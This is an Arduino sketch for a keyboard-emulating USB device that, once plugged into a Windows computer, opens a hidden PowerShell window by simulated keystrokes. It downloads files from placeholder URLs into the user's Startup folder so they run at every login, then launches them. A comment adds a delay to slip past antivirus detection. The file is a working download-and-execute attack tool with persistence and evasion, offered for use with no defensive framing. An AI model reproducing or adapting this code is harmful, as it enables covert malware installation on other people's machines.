#include <Keyboard.h>

void fastType(const char* text) {
  while (*text) {
    Keyboard.write(*text++);
    delay(1); //smanji da bude brze
  }
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(50);
}

void setup() {
  delay(1500); 
  Keyboard.begin();

  // Open Run 
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(300);

 
  fastType("powershell -WindowStyle Hidden");
  delay(600); 

  // Define download URLs and target path
  fastType("$s=$env:APPDATA+'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'");
  fastType("Invoke-WebRequest 'INPUT RAW HTTPS LINK HERE' -OutFile ($s+'NAME')");
  //some AVs have a signature detection for very fast consecutive typing thus this code snippet BELOW can be used for avoiding it.
  fastType("Start-Sleep -Seconds 1");
  // completely optional^^^^
  fastType("Invoke-WebRequest 'PLACEHOLDER' -OutFile ($s+'PLACEHOLDER')");
  fastType("Start-Process ($s+'PLACEHOLDER')");

  delay(500);
  Keyboard.end();
}

void loop() {}
//THIS IS MEANT TO BE USED WITH ATmega32u4 CHIPSET, but any HID compatible board can be used...





